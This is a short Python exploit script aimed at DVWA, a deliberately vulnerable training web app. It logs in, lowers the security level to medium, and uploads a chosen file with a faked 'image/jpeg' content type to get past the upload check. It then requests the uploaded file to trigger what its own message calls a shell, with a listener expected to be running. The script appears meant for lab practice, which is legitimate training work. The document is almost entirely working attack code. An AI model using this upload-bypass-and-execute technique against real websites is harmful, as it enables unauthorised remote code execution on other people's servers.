#!/usr/bin/python

import requests
import argparse
import re

parser=argparse.ArgumentParser()
parser.add_argument('--url',type=str,required=True)
parser.add_argument('--username',type=str, required=True)
parser.add_argument('--password',type=str, required=True)
parser.add_argument('--file',type=str, required=False)
args=parser.parse_args()


proxy = {'http':'http://localhost:8080'}
def login():
    data={'username':args.username,'password':args.password,'Login':'Login'}
    
    #starting a session
    req=requests.session()
    res=req.post(args.url,data=data,proxies=proxy)
    print(res.status_code)
    
    #separating the base url
    '''
    d = '/'
    list1=[x+d for x in url.split(d) if x]
    base_url=str(list1[0])+"/"+str(list1[1]+list1[2])
    print(base_url)
    '''
    mtch=re.search("failed",res.text)
    if mtch:
        print("login failed. Please check creds")
        exit()
        #req.get(base_url+"vulnerabilites/upload/index.php")
    else:
        print("login success")

    #changing the difficulty level 
    # getting the http://ip/
    parts=args.url.split('//',1)
    host=parts[0]+"//"+parts[1].split('/',1)[0]
    print(host)    
    
    #changing the difficulty level
    print("changing the difficulty level to medium ....")
    body={'security':'medium','seclev_submit':'Submit'}
    res3=req.post(host+"/dvwa/security.php",data=body,proxies=proxy)
    print("new cookies are : "+str(res3.cookies.get_dict()))
    
    #code to uploade a file 

    print("uploading file at : "+host+"/dvwa/vulnerabilities/upload/")
    
    file_to_upload={'uploaded': (args.file,open(args.file,'rb'),'image/jpeg')}
    body={'Upload':'Upload'}
    f_upload=req.post(host+"/dvwa/vulnerabilities/upload/",files=file_to_upload,proxies=proxy,data=body)
    print(f_upload.url)
    #print(f_upload.text)
    mtch=re.findall("succesfully",f_upload.text)
    print(mtch)
    if mtch:
        print("file uploaded succesfully")
        tag='pre'
        regex_str="<"+tag+">(.*?)</"+tag+">"
        upload_path=re.findall(regex_str,f_upload.text)
        print(type(upload_path))
        print("file is uploaded at : "+str(upload_path[0]).split()[0])
    else :
        print("encountered some error. failed to upload")
    
    print("calling the shell, hope your listener is on...")
    req.get(f_upload.url+str(upload_path[0].split()[0]))
    

login()



